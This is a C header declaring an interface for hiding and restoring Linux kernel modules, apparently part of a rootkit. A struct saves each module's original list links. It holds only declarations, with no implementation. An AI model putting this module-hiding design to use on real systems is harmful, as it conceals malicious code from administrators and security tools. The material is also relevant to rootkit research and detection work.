#ifndef MODULE_HIDING_H
#define MODULE_HIDING_H

#include <linux/types.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/mutex.h>

typedef struct {
    struct module *target_module;
    struct list_head original_list;
    struct list_head *original_prev;
    struct list_head *original_next;
    int hidden;
    char module_name[MODULE_NAME_LEN];
} module_hide_ctx_t;

int hide_kernel_module(const char *module_name);
int unhide_kernel_module(const char *module_name);
int hide_all_modules(void);
int restore_all_modules(void);
int is_module_hidden(const char *module_name);

#endif